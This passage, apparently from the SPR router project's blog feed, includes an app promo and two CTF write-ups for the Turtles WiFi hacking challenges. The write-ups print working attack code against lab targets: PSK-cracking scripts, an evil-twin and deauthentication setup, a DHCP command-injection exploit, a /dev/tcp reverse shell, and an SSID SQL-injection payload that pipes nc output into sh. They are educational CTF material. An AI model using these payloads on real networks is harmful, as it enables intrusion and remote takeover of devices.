/>\\n\\n</div>\\n\\n\\n### Connect Your Friends Quickly and Securely\\n\\nWith the SPR App you can securely bring a new device onto your wifi network in only a few seconds.\\nTo do so, add a new device, set a name, and hit next to generate a secure password.\\nThen scan the QR code from the new device and it will be good to go.\\n\\n<div style={{ display: \\"flex\\", flexDirection: \\"row\\", padding:4, gap:8, marginBottom: 20 }}>\\n\\n<img src={iosDeviceAdd1} width={\\"50%\\"} />\\n<img src={iosDeviceAdd2} width={\\"50%\\"} />\\n\\n</div>\\n\\nBy default, the new device has access to just the internet and nothing else.\\nYou can join it into groups for access to local network devices. For example,\\na gaming group for playing LAN networked games.\\n\\n\\n### Ad Blocking and DNS Controls\\n\\nEnhance your browsing experience by blocking intrusive ads at the network level. You can also view and customize your network device\'s DNS requests.\\n\\n<div style={{ display: \\"flex\\", flexDirection: \\"row\\", padding:4, gap:8, marginBottom: 20 }}>\\n\\n<img src={iosDNSBlock} width={\\"50%\\"} />\\n<img src={iosDNS} width={\\"50%\\"} />\\n\\n</div>\\n\\n### Remote Configuration via VPN\\n\\n![spr vpn client](/img/spr-infographics/spr-vpn-client.png)\\n\\nSPR works great for turning your home network into a personal VPN service. You can also host SPR in the cloud.\\nUsing SPR to VPN your mobile devices helps get better network speeds to work around operator traffic shaping, as well as keep access to media services while traveling. And it\'s also helpful to maintain ad blocking while on the go, without adding any software at all to your devices.\\n\\nWith the App you can manage your SPR over the VPN itself.\\n\\n<div style={{ display: \\"flex\\", flexDirection: \\"row\\", padding:4, gap:8, marginBottom: 20 }}>\\n\\n<img src={iosVPN} width={\\"50%\\"} />\\n<img src={iosVPN2} width={\\"50%\\"} />\\n\\n</div>\\n\\nTo learn more about running SPR using VPN, with all its features except WiFi, check out the [ Virtual SPR Setup Guide](/pages/docs/setup_guides/virtual_spr)\\n\\n\\n### Next Steps\\n\\nIf you\'d like to experience the power of open-source networking and take control of your network\'s security and privacy,\\ngive SPR a try.\\n\\nWhether you\'re connecting directly to your SPR device or remotely through a VPN, our app offers a seamless and intuitive interface, empowering you to create a hardened and resilient home network environment.\\n\\nYou can [download our iOS app](https://apps.apple.com/en/app/secure-programmable-router/id6443709201) today.\\nVisit our [homepage](https://www.supernetworks.org/) to learn more.\\n\\nThe source code for the app is [available on GitHub](https://github.com/spr-networks/super/tree/main/frontend).\\n\\n\\n**App Privacy and Privacy Policy**\\n\\n<div class=\\"app-privacy__cards\\" style={{marginBottom: \\"20px\\"}}>\\n<div class=\\"app-privacy__card\\" style={{backgroundColor: \\"#f8f8f8\\", padding: \\"28px 20px 20px 20px\\", borderRadius: \\"16px\\", textAlign:\\"center\\"}}>\\n<div class=\\"privacy-type__icon\\">\\n<svg style={{fill: \\"#0070c9\\"}} xmlns=\\"http://www.w3.org/2000/svg\\" width=\\"32\\" height=\\"32\\" viewBox=\\"0 0 64 64\\" aria-hidden=\\"true\\"><path d=\\"M32.09 61.568c16.185 0 29.586-13.43 29.586-29.587 0-16.186-13.43-29.587-29.616-29.587-16.157 0-29.558 13.4-29.558 29.587 0 16.156 13.43 29.587 29.587 29.587zm0-4.932c-13.692 0-24.628-10.964-24.628-24.655 0-13.692 10.907-24.656 24.598-24.656 13.691 0 24.656 10.964 24.685 24.656.03 13.69-10.965 24.655-24.656 24.655zM28.897 45.76c.958 0 1.77-.464 2.35-1.363L44.504 23.54c.32-.551.696-1.219.696-1.857 0-1.276-1.16-2.117-2.378-2.117-.725 0-1.45.435-2.002 1.305l-12.038 19.29-5.714-7.368c-.696-.928-1.334-1.19-2.146-1.19-1.248 0-2.234 1.016-2.234 2.321 0 .61.261 1.247.667 1.799l7.078 8.673c.725.957 1.508 1.363 2.465 1.363z\\"></path></svg>\\n</div>\\n<h3 class=\\"privacy-type__heading\\">Data Not Collected</h3>\\n<p class=\\"privacy-type__description\\">Supernetworks, Inc. does not collect any data from this app.</p>\\n</div>\\n</div>\\n\\n\\nWe do not collect any personal information about you, such as your name, address, or email address, when you use our app.\\n\\nOur app does not use any third-party services that collect or use personal information. We may receive crash logs from Apple which include anonymized code stack traces from where the errors occured.\\n\\nWe do not share customer data with any third-party services.\\n\\n[Read our Privacy Policy here](https://www.supernetworks.org/privacy-policy.html)"},{"id":"barely-ap","metadata":{"permalink":"/pages/blog/barely-ap","source":"@site/blog/2023-05-11-barely-ap.md","title":"Barely AP is Almost an Access Point","description":"Introducing Barely AP","date":"2023-05-11T00:00:00.000Z","tags":[{"inline":true,"label":"Python","permalink":"/pages/blog/tags/python"},{"inline":true,"label":"Scapy","permalink":"/pages/blog/tags/scapy"},{"inline":true,"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"}],"readingTime":0.69,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"barely-ap","title":"Barely AP is Almost an Access Point","authors":"ltsrad","tags":["Python","Scapy","WiFi"]},"unlisted":false,"prevItem":{"title":"SPR Now Available on the iOS App Store","permalink":"/pages/blog/ios-app-released"},"nextItem":{"title":"March 2023\'s Turtles Challenge","permalink":"/pages/blog/spr-turtles-march"}},"content":"## Introducing Barely AP\\n\\nWe\'ve [published barely an implementation of a WiFi 802.11 Access Point, using Scapy](https://github.com/spr-networks/barely-ap) to teach people about WiFi authentication.\\n\\n\x3c!-- truncate --\x3e\\n\\n### What\\n\\nOn Linux, this code lets you spin up a python access point over monitor mode.  It implements features like handling probe requests, authentication, association, and reassociation, and encryption and decryption of data using CCMP (Counter Mode Cipher Block Chaining Message Authentication Code Protocol).\\n\\n### Note\\nThis code just barely gets the job done -- it should NOT be used as a reference for writing production code. It has NO protocol security, as it is not security robust despite performing authenticated CCMP encryption.\\n\\n### Usage:\\n\\n\\nBuilding & running\\n```bash\\n./build.sh\\n./setup.sh\\n```\\n\\nInspect IP traffic\\n\\n```\\n\\ndocker exec -it barely-ap tcpdump -i scapyap\\ndocker exec -it barely-sta tcpdump -i wlan1\\n```"},{"id":"spr-turtles-march","metadata":{"permalink":"/pages/blog/spr-turtles-march","source":"@site/blog/2023-05-05-turtles-march.md","title":"March 2023\'s Turtles Challenge","description":"Editor\'s note:","date":"2023-05-05T00:00:00.000Z","tags":[{"inline":true,"label":"Turtles","permalink":"/pages/blog/tags/turtles"},{"inline":true,"label":"CTF","permalink":"/pages/blog/tags/ctf"},{"inline":true,"label":"Hacking","permalink":"/pages/blog/tags/hacking"},{"inline":true,"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"},{"inline":true,"label":"Airocrack","permalink":"/pages/blog/tags/airocrack"},{"inline":true,"label":"Salsa20","permalink":"/pages/blog/tags/salsa-20"},{"inline":true,"label":"WPA2","permalink":"/pages/blog/tags/wpa-2"}],"readingTime":9.065,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"spr-turtles-march","title":"March 2023\'s Turtles Challenge","authors":"ltsrad","tags":["Turtles","CTF","Hacking","WiFi","Airocrack","Salsa20","WPA2"]},"unlisted":false,"prevItem":{"title":"Barely AP is Almost an Access Point","permalink":"/pages/blog/barely-ap"},"nextItem":{"title":"January 2023\'s Turtles Challenge","permalink":"/pages/blog/january-2023-turtles"}},"content":"#### Editor\'s note:\\n\\nThe Turtles WiFi challenges are a series of ctf-style problems concerning network and wifi security skills.\\n\\nThe tasks were a bit challenging, and invovled a combination of WiFi Cracking and exploring how WPA Authentication works,\\nagainst a custom Access point using Salsa20 instead of AES.\\n\\n[Axel Souchet](https://twitter.com/0vercl0k) has kindly shared his writeup with us, which we share below.\\n\\n# Turtles: Virtual WiFi Hacking Challenges - March 2023\\n\\n## Introduction\\n\\nThe older I get, the more fascinated I have become with the world surrounding me; I ask myself all the time \'how does this thing work uh \ud83e\udd14?\'. It is both fun and rewarding for me to understand the world a bit better. This is also a great way to be constantly humbled by the magic that surrounds us \ud83c\udf08\\n\\nAlthough I enjoy the process of learning how things work, there are millions of things that I interact with daily, that I know so little about; embarrassing.\\n\\nHeck, how does WiFi work I thought? Because I know that I learn best by getting my hands dirty, I decided to try to solve a few challenges as an introduction. That is why I decided to check-out the March [Turtle challenge](https://turtles.supernetworks.org/) \ud83d\ude42\\n\\nIf you want to play at home, you can find the challenges on Github and one the SPR website:\\n- https://turtles.supernetworks.org/march\\n- https://github.com/spr-networks/turtles-march-2023\\n\\nYou can participate either directly from your browser via an impressive emulated Linux environment or you can self-host the challenge by cloning the [turtles-march-2023](https://github.com/spr-networks/turtles-march-2023) repository and follow the instructions. I chose to self-host the challenges as it made it easier to debug for me.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Warmups\\n\\nAll right, enough blah blah and let\'s get warmed up. In that part of the challenge, we are asked to extract data off two packet captures: `turtle0.pcap` & `turtle0.5.pcap`.\\n\\nFor the first capture, we need to extract a PSK that looks like the following: `turtle{x}`, great. Because we don\'t have more details regarding the PSK\'s shape itself, it is fair to assume that the authors want us to use a wordlist attack instead of trying to bruteforce it.\\n\\nI grabbed the famous [rockyou](https://github.com/zacheller/rockyou) wordlist and I wrote a small Python script to format prepend / append `turtle{}` as this is what the PSK will look like.\\n\\n```py\\nwith open(\'rockyou-turtle.txt\', \'w\', encoding=\'utf8\') as fout:\\n    with open(\'rockyou.txt\', \'r\', encoding=\'utf8\', errors=\'replace\') as fin:\\n        for line in fin.readlines():\\n            line = line.strip()\\n            fout.write(f\'turtle{{{line}}}\\\\n\')\\nprint(\'Done\')\\n```\\n\\nThen, I ran [aircrack-ng](https://www.aircrack-ng.org/) with the new wordlist against `turtle0.pcap` with the following command: `$ aircrack-ng turtle0.pcap -w rockyou-turtle.txt`.\\n\\nAfter a few minutes, a valid key was found: `turtle{power}`, great!\\n\\n```\\n                        Aircrack-ng 1.6\\n\\n[00:00:01] 3200/2465175 keys tested (5273.73 k/s)\\n\\nTime left: 7 minutes, 46 seconds                           0.13%\\n\\n                    KEY FOUND! [ turtle{power} ]\\n\\n\\nMaster Key     : 11 8C 23 85 2D 5F 7E AC DE 8C 85 B0 CB 80 02 5F\\n                CA 48 34 DF CE 2D 2A 7C 3C 01 4B A8 14 B7 2D E1\\n\\nTransient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n\\nEAPOL HMAC     : 6B D2 F8 71 7F E5 D8 5E 5B 68 FE 53 0A 28 9D 4E\\n```\\n\\nThe next challenge says that there is data to be decrypted inside `turtle0.5.pcap`. Both the station and the AP use the [4-way handshake](https://en.wikipedia.org/wiki/IEEE_802.11i-2004) to derive various keys that are used to encrypt traffic. We cracked a PSK in the previous step, so we can  open the packet capture into [Wireshark](https://www.wireshark.org/) and let it decrypt the traffic for us. Follow Wireshark\'s [HowToDecrypt802.11](https://wiki.wireshark.org/HowToDecrypt802.11) article to know how to do that.\\n\\nOnce decrypted, there is a `PING` request with a flag in its payload: `turtle{deecoded}`, awesome.\\n\\n## Step 1\\n\\nOkay warmups done, time to have a look at the real challenges. For this step, the authors ask for us to crack another PSK from another packet capture of a handshake. We also have the [source code of a custom AP](https://github.com/spr-networks/turtles-march-2023/blob/main/t1_start/turtle1-ap-pcap.py).\\n\\nI initially threw `turtle1-handshake.pcap` at [aircrack-ng](https://www.aircrack-ng.org/) with the `rockyou-turtle.txt` wordlist but no valid key was found, bummer. I thought it was possible that this key was part of another famous wordlist so I downloaded a bunch of them, but ... same. Weird.\\n\\nI learned more about the 4-way handshake to understand how both the station & AP derive the keys needed to transmit / verify encrypted frames. Because the handshake was captured from a custom AP, it made sense to me that maybe [aircrack-ng](https://www.aircrack-ng.org/) didn\'t understand the handshake properly and missed PSK.\\n\\nI decided to implement the attack on my own. I used the MIC code that is sent by the AP in the 3rd message to verify if a candidate is valid or not (on top of the nonces/macs in the first / second messages). We have the entire EAPOL packet so we can compute the MIC code ourselves and verify if it matches the one sent by the AP. If it does, it means we have found a valid PSK \ud83e\udd24\\n\\nI ran the script against the *turtleified* rockyou wordlist, and eventually (it\'s slow!) found a valid PSK candidate: `turtle{excellent}` \ud83d\udd25\\n```python\\n# Axel \'0vercl0k\' Souchet - April 15 2023\\n# WIN w/ b\'turtle{excellent}\'\\nimport hashlib\\nimport hmac\\nfrom scapy.all import *\\n\\nclass EAPOL_KEY(Packet):\\n    name = \'EAPOL_KEY\'\\n    fields_desc = [\\n        ByteEnumField(\'key_descriptor_type\', 1, {1: \'RC4\', 2: \'RSN\'}),\\n        BitField(\'reserved2\', 0, 2),\\n        BitField(\'smk_message\', 0, 1),\\n        BitField(\'encrypted_key_data\', 0, 1),\\n        BitField(\'request\', 0, 1),\\n        BitField(\'error\', 0, 1),\\n        BitField(\'secure\', 0, 1),\\n        BitField(\'has_key_mic\', 1, 1),\\n        BitField(\'key_ack\', 0, 1),\\n        BitField(\'install\', 0, 1),\\n        BitField(\'key_index\', 0, 2),\\n        BitEnumField(\'key_type\', 0, 1, {0: \'Group/SMK\', 1: \'Pairwise\'}),\\n        BitEnumField(\'key_descriptor_type_version\', 0, 3, {\\n            1: \'HMAC-MD5+ARC4\',\\n            2: \'HMAC-SHA1-128+AES-128\',\\n            3: \'AES-128-CMAC+AES-128\',\\n            0x20: \'SALSA20-HMAC\'\\n        }),\\n        LenField(\'key_length\', None, \'H\'),\\n        LongField(\'key_replay_counter\', 0),\\n        XStrFixedLenField(\'key_nonce\', b\'\\\\x00\'*32, 32),\\n        XStrFixedLenField(\'key_iv\', b\'\\\\x00\'*16, 16),\\n        XStrFixedLenField(\'key_rsc\', b\'\\\\x00\'*8, 8),\\n        XStrFixedLenField(\'key_id\', b\'\\\\x00\'*8, 8),\\n        XStrFixedLenField(\'key_mic\', b\'\\\\x00\'*16, 16),\\n        LenField(\'wpa_key_length\', None, \'H\'),\\n        ConditionalField(\\n            XStrLenField(\'key\', b\'\\\\x00\'*16,\\n                         length_from=lambda pkt: pkt.wpa_key_length),\\n            lambda pkt: pkt.wpa_key_length and pkt.wpa_key_length > 0)\\n    ]\\n\\n\\ndef customPRF512(key, amac, smac, anonce, snonce):\\n    \\"\\"\\"Source https://stackoverflow.com/questions/12018920/\\"\\"\\"\\n    A = b\\"Pairwise key expansion\\"\\n    B = b\\"\\".join(sorted([amac, smac]) + sorted([anonce, snonce]))\\n    num_bytes = 64\\n    R = b\'\'\\n    for i in range((num_bytes * 8 + 159) // 160):\\n        R += hmac.new(key, A + chb(0x00) + B + chb(i), hashlib.sha1).digest()\\n    return R[:num_bytes]\\n\\ndef calc(pwd):\\n    amac = bytes.fromhex(\'02:00:00:00:00:00\'.replace(\':\', \'\'))\\n    smac = bytes.fromhex(\'02:00:00:00:01:00\'.replace(\':\', \'\'))\\n    anonce = bytes.fromhex(\\n        \'7338c25bf9d1bba6a8dea56e87bb8b6a2e3f658be7ba8173c6ab58991e648e5f\')\\n    snonce = bytes.fromhex(\\n        \'82ce083ab0cdb46f1ae0cc94a922cdf7ca742bf130396996f92be706cca62a25\')\\n    PMK = hashlib.pbkdf2_hmac(\'sha1\', pwd, b\'turtle1\', 4_096, 32)\\n    KCK = customPRF512(PMK, amac, smac, anonce, snonce)[:16]\\n    keydata = bytes.fromhex(\'ace914ed4b7bf2b638b81c841bd3ab67561681d57591496ff93465d173c04f911679a118fb7f9590faef7fe21aa5c82d8bc746b190ea84e1\')\\n    assert len(keydata) == 56\\n    ek = EAPOL(version=\'802.1X-2004\',type=\'EAPOL-Key\') / EAPOL_KEY(\\n        key_descriptor_type=2, key_descriptor_type_version=2, install=1, key_type=1, key_ack=1,\\\\\\n        has_key_mic=1, secure=1, encrypted_key_data=1, key_replay_counter=2, \\\\\\n        key_nonce=anonce, key_length=16, key=keydata, wpa_key_length=len(keydata)\\n    )\\n    return hmac.new(KCK, ek.build(), hashlib.sha1).digest()[:16]\\n\\ndef main():\\n    wanted = bytes.fromhex(\'7235448e1b056108e40ff429ad3545ab\')\\n    assert len(wanted) == 16\\n    with open(\'rockyou-turtle.txt\', \'r\', encoding=\'utf8\') as fin:\\n        for line in fin.readlines():\\n            candidate = line.strip().encode()\\n            c = calc(candidate)\\n            assert len(c) == 16\\n            if c == wanted:\\n                print(f\'WIN w/ {candidate}\')\\n                return\\n    print(\'Done\')\\n\\nif __name__ == \'__main__\':\\n    main()\\n```\\n\\n## Step 2\\n\\nAll right, final step. In this step, we are given another custom [AP\'s source code](https://github.com/spr-networks/turtles-march-2023/blob/main/t1_ap/turtleap/go.py) and we need to break in. How exciting uh?\\n\\nFor this step, I set-up an environment to debug and interact with the AP. I created a regular Hyper-V Ubuntu VM (note that this won\'t work from WSL2) and ran the two containers with the below commands:\\n\\n```text\\nover@bubuntu:~/turtles-march-2023$ sudo docker compose up -d\\n[sudo] password for over:\\nStarting t1_ap    ... done\\nStarting t1_start ... done\\n\\nover@bubuntu:~/turtles-march-2023$ sudo ./setup.sh\\n```\\n\\nAt that stage, you can log-in into both containers with the following commands:\\n\\n```text\\nover@bubuntu:~/turtles-march-2023$ sudo docker exec -it t1_start bash\\nover@bubuntu:~/turtles-march-2023$ sudo docker exec -it t1_ap bash\\n```\\n\\n`t1_ap` is the container that runs the AP and `t1_start` is where you can run a client and send packets to the AP. This is cool because you don\'t need any physical Wifi device to play in this environment!\\n\\nOne of the keys that is derived during the 4-way handshake is meant to be shared by every station; kind of a group key. My understanding is that it is used to send broadcast-like packets to every station. In the AP, it turns out this key is a constant: `turtle{everyone gets a shell :)}` \ud83d\ude2c\\n\\nAfter reading the code carefully, it is clear that there you don\'t need to be associated with the AP to send a packet encrypted with this group key. This is particularly interesting because we don\'t have knowledge of the PSK which means we wouldn\'t be able to complete the 4-way handshake. In a normal AP, the `GTK` is shared in an encrypted frame and it isn\'t a constant / isn\'t known by an attacker (and is rotated every time a station disconnects).\\n\\nFinally, an attacker can trigger a shell command injection when the AP parses a DHCP offer packet:\\n```py\\ndef reply_dhcp_offer(self, incoming):\\n    # ...\\n    for o in incoming[DHCP].options:\\n        # Log hostname for DNS revers lookup\\n        if o[0] == \'hostname\':\\n            cmd = \\"echo %s %s.lan >> hostnames.txt\\" % (dest_ip, o[1].decode(\\"ascii\\"))\\n            os.system(cmd )\\n```\\n\\nAt this point we have every ingredients to break into the AP and execute arbitrary shell commands by sending a specially crafted DHCP offer packet  encrypted with the GTK \ud83d\udd25; here\'s my code that can be run from `t1_start`:\\n```py\\n# Axel \'0vercl0k\' Souchet - April 11 2023\\nfrom scapy.all import *\\nfrom salsa20 import Salsa20\\nfrom itertools import count\\nimport hmac\\nimport hashlib\\nimport struct\\n\\ngtk_full = b\'turtle{everyone gets a shell :)}\'\\nGTK = gtk_full[:16]\\nMIC_AP_TO_GROUP = gtk_full[16:24]\\ngroup_IV = count()\\n\\ndef encrypt(pkt):\\n  data = pkt.build()\\n  pn = next(group_IV)\\n  aad_calc = hmac.new(MIC_AP_TO_GROUP, data, hashlib.sha1).digest()[:16]\\n  key = GTK\\n  cipher = Salsa20(key, struct.pack(\'>Q\', pn))\\n  payload = cipher.encrypt(data) + aad_calc\\n  pn0 = pn & 0xff\\n  pn1 = (pn>>8) & 0xff\\n  pn2 = (pn>>16) & 0xff\\n  pn3 = (pn>>24) & 0xff\\n  return Dot11CCMP(data=payload, ext_iv=1, key_id=1, PN0 = pn0, PN1=pn1, PN2=pn2, PN3=pn3)\\n\\ndef main():\\n    # root@0c0b905e70eb:/# iw dev\\n    # phy#0\\n    #   Interface mon0\\n    #     ifindex 2\\n    #     wdev 0x2\\n    #     addr 02:00:00:00:00:00\\n    #     type monitor\\n    #     txpower 20.00 dBm\\n    #   Interface wlan0\\n    #     ifindex 50\\n    #     wdev 0x1\\n    #     addr 02:00:00:00:00:00\\n    #     type managed\\n    #     txpower 20.00 dBm\\n    ap = \'02:00:00:00:00:00\'\\n    # root@29a50eeb6fb5:/x# iw dev\\n    # phy#1\\n    #   Interface wlan1\\n    #     ifindex 51\\n    #     wdev 0x100000001\\n    #     addr 02:00:00:00:01:00\\n    #     type managed\\n    #     txpower 20.00 dBm\\n    station = \'02:00:00:00:01:00\'\\n    cmd = \'id; ls /\'\\n    inner_pkt = Ether(src=station) / IP() / UDP(dport=67) / BOOTP(op=1) / DHCP(options=[\\n        (\'hostname\', f\'; {cmd} #\'),\\n    ])\\n    receiver = ap\\n    sender = station\\n    bssid = ap\\n    pkt = RadioTap() / Dot11(addr1=receiver, addr2=sender, addr3=bssid, FCfield=\'to-DS+protected\') / encrypt(inner_pkt)\\n    pkt.show()\\n    os.system(\'iw dev wlan1 interface add mon1 type monitor 2>/dev/null\')\\n    sendp(pkt, iface = \'mon1\', verbose = True)\\n\\nif __name__ == \'__main__\':\\n    main()\\n```\\n\\nThanks again to SPR, the challenge authors for putting out free educational content, you guys rock \ud83d\udc4f\ud83c\udffd\u270a\ud83c\udffd"},{"id":"january-2023-turtles","metadata":{"permalink":"/pages/blog/january-2023-turtles","source":"@site/blog/2023-02-15-turtles-jan.md","title":"January 2023\'s Turtles Challenge","description":"Editor\'s note:","date":"2023-02-15T00:00:00.000Z","tags":[{"inline":true,"label":"Turtles","permalink":"/pages/blog/tags/turtles"},{"inline":true,"label":"CTF","permalink":"/pages/blog/tags/ctf"},{"inline":true,"label":"Hacking","permalink":"/pages/blog/tags/hacking"},{"inline":true,"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"},{"inline":true,"label":"EvilTwin","permalink":"/pages/blog/tags/evil-twin"},{"inline":true,"label":"Deauthentication","permalink":"/pages/blog/tags/deauthentication"}],"readingTime":8.76,"hasTruncateMarker":true,"authors":[{"name":"Amy","url":"https://twitter.com/itszn13","key":"Amy","page":null}],"frontMatter":{"slug":"january-2023-turtles","title":"January 2023\'s Turtles Challenge","authors":"Amy","tags":["Turtles","CTF","Hacking","WiFi","EvilTwin","Deauthentication"]},"unlisted":false,"prevItem":{"title":"March 2023\'s Turtles Challenge","permalink":"/pages/blog/spr-turtles-march"},"nextItem":{"title":"Run Virtual SPR on a Google Cloud Free Tier Instance","permalink":"/pages/blog/virtual-spr-on-a-gcloud-tier-free-instance"}},"content":"#### Editor\'s note:\\n\\n\\nThe Turtles WiFi challenges are a series of ctf-style problems concerning network and wifi security skills.\\nWe first ran a challenge in this style at [Stockholm\'s Midnight Sun CTF Finals in August \'22 at the Turtles MidnightSun Finals](https://github.com/spr-networks/turtles-midnightsunctf-2022-finals). You can play along with January\'s challenge, with the [github repository](https://github.com/spr-networks/turtles-january-23).\\n\\nJanuary\'s winner, [Amy](https://twitter.com/itszn13) from [Ret2 Systems](https://ret2.io/), has kindly let us share their challenge writeup. Congratulations! And thanks again for putting this writeup together.\\n\\nFebruary\'s contest will be released on the 20th and we will be giving out more raspberry pis!\\n\\n## Intro\\n\\nWe find ourselves in a twisting maze of WLANs. There are 5 machines connected across several WLAN networks. We start as root on the first machine and must move laterally across the network to exfiltrate 3 flag files.  From our box we can connect to an access point with the SSID \\"jan-turtle1\\".\\n\\n![](/img/xturtles_jan.png)\\n\\n\x3c!-- truncate --\x3e\\n\\n## Flag 1\\nOur first target is also connected to the \\"jan-turtle1\\" AP over WPA3. We can assume that the target may be doing something interesting over this network, so performing a MitM attack may be fruitful. To pull this off we can use the so-called [\\"Evil Twin Attack\\"](https://en.wikipedia.org/wiki/Evil_twin_(wireless_networks)) where we impersonate the AP.\\n\\nFirst we need to set up our own AP with the same SSID and configuration as the existing \\"jan-turtle1\\" AP. I used `hostapd` to do this with the following config:\\n\\n```\\ninterface=wlan2\\ndriver=nl80211\\nhw_mode=a\\nchannel=40\\nssid=jan-turtle1\\nwpa=2\\nwpa_key_mgmt=SAE\\nwpa_pairwise=CCMP\\nap_isolate=1\\nsae_password=sn0wt0rt0ise\\n```\\n\\n```bash\\nip addr add dev wlan2 192.168.1.1/24\\nhostapd -B /root/h.conf\\n```\\n\\nOnce we have the AP up and running, clients looking for the real \\"jan-turtle1\\" AP may connect to our malicious AP instead. However the target is already connected to the existing AP, so it won\'t attempt to reconnect to our AP.\\n\\nLuckily we can force it off of the original AP by abusing [deauthentication packets](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack). If we send these packets with a spoofed target address, we cause the target to disconnect. Once the client has disconnected, there is a chance that they will reconnect to our malicious access point. We can use [`aireplay-ng`](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) to perform this attack on a second WLAN:\\n```bash\\nip link set dev wlan3 up\\nyes | airmon-ng start wlan3 40\\n# Start deauth on target MAC\\naireplay-ng -0 10 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan3mon &\\n```\\n\\n```\\n# tcpdump -i wlan2 -v\\n06:09:53  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 40\\n06:09:53  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00\\ntcpdump: listening on wlan2, link-type EN10MB (Ethernet), snapshot length 262144 bytes\\n06:10:01.225272 02:00:00:00:01:00 (oui Unknown) > Broadcast Null Unnumbered, xid, Flags [Response], length 6: 01 00\\n06:10:08.879191 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.1.1 tell 192.168.1.2, length 28\\n06:10:08.879228 ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.1.1 is-at 02:00:00:00:02:00 (oui Unknown), length 28\\n08:35:14.868587 IP (tos 0x0, ttl 64, id 18623, offset 0, flags [DF], proto TCP (6), length 60)\\n    192.168.1.2.49070 > 192.168.1.1.http: Flags [S], cksum 0x27e2 (correct), seq 547073709, win 64240, options [mss 1460,sackOK,TS val 3350547164 ecr 0,nop,wscale 7], length 0\\n06:10:08.879473 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)\\n    192.168.1.1.http > 192.168.1.2.49070: Flags [R.], cksum 0x9d34 (correct), seq 0, ack 547073710, win 0, length 0\\n```\\nLooks like there is a unencrypted HTTP request! Lets host our own http server using python:\\n```\\n# python3 -m http.server 80\\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)\\n192.168.1.2 - - [15/Feb/2023 06:17:06] \\"GET /install.sh HTTP/1.1\\" 404 -\\n192.168.1.2 - - [15/Feb/2023 06:17:16] code 404, message File not found\\n```\\nIf we create our own `install.sh`, it looks like the box will run it! Lets get a reverse shell\\n```bash\\nbash -i >& /dev/tcp/192.168.1.1/1337 0>&1\\n```\\nNice, we captured the first flag!\\n```\\nListening on 0.0.0.0 1337\\nConnection received on 192.168.1.2 47550\\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@2d419af9c243:/# cat flag1.txt\\nturtles{0f004d8e004f4577952eda915426eac38f4df6b4}\\nroot@2d419af9c243:/#\\n```\\n\\n## Flag 2\\n\\nFor the second stage, we are given a binary named [`wardriver`](https://en.wikipedia.org/wiki/Wardriving) which is running on the second target. This binary has two main features. First it used `iw dev <dev> scan` to collect information on all near by access points.\\n\\n```c\\nint getData() {\\n  __snprintf_chk(command, 256LL, 1LL, 256LL, \\"iw dev %s scan\\", (const char *)IFACE);\\n  if ( fopen(\\"scan.txt\\", \\"r\\") )\\n    strcpy(command, \\"cat scan.txt\\");\\n  v0 = popen(command, \\"r\\");\\n  insert(v0);\\n  ...\\n  sqlite3_exec(v7, v8, 0LL, 0LL);\\n}\\n__int64 __fastcall insert(...) {\\n  ...\\n  __snprintf_chk(\\n        v8, 256LL, 1LL, 256LL,\\n        \\"INSERT INTO wifis VALUES(%d, \'%s\', \'%s\', \'%s\');\\",\\n        _id, bss_str, ssid_str, signal_str,\\n    );\\n}\\n```\\n\\nIf we create an malicious AP, the SSID will be formatted into this INSERT command. We can use this to perform an SQL insert injection into the database, allowing us to control any field of a new entry to the `wifis` table.\\n\\nNext we look at the second functionality. The binary will periodically dump values from the table and send them as data using a curl command:\\n\\n```c\\n__int64 dump() {\\n  ...\\n  v0 = sqlite3_exec(v3, \\"SELECT * FROM wifis\\", callback, 0LL);\\n  ...\\n}\\n__int64 __fastcall callback(...) {\\n...\\n  if ( bss_str && signal_str ) {\\n    __snprintf_chk(\\n      command, 128LL, 1LL, 128LL,\\n      \\"curl %s --data \\\\\\"{\\\\\\\\\\\\\\"bss\\\\\\\\\\\\\\": \\\\\\\\\\\\\\"%s\\\\\\\\\\\\\\", \\\\\\\\\\\\\\"signal\\\\\\\\\\\\\\": \\\\\\\\\\\\\\"%s\\\\\\\\\\\\\\"}\\\\\\"\\",\\n      \\"http://127.0.0.1:8080/logs\\",\\n      bss_str, signal_str);\\n    system(command);\\n    return 0LL;\\n  }\\n  return 1LL;\\n}\\n```\\n\\nWe can see that there is no sanitization of the `bss` or `signal` columns when formatted into the command. We can trigger command injection here by creating a malicious wifi entry using the SQL injection in the previous function. The length of command injection in the SSID is limited, so I fetched a second stage from a remote host. Here is the `hostapd` config with the SQL injection payload:\\n```sql\\ninterface=wlan4\\ndriver=nl80211\\nhw_mode=a\\nchannel=48\\nssid=\',\'\'),(2,\'`nc some-host 9|sh`\',\'\\nwpa=2\\nwpa_key_mgmt=SAE\\nwpa_pairwise=CCMP\\nap_isolate=1\\nsae_password=shred_the_gnar_pow\\n```\\n\\nAfter a few seconds the wardriver picks up our AP and we get a connect back on the second target!\\n```\\n$ nc -l 1338 -v\\nListening on 0.0.0.0 1338\\nConnection received on 192.168.1.2 58580\\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@b976e8a2f52b:/# cat flag2.txt\\ncat flag2.txt\\nturtles{f0c03d9e242a89f1df51e5da9a833750398fe989}\\nroot@b976e8a2f52b:/#\\n```\\n\\n## Flag 3\\nFor the 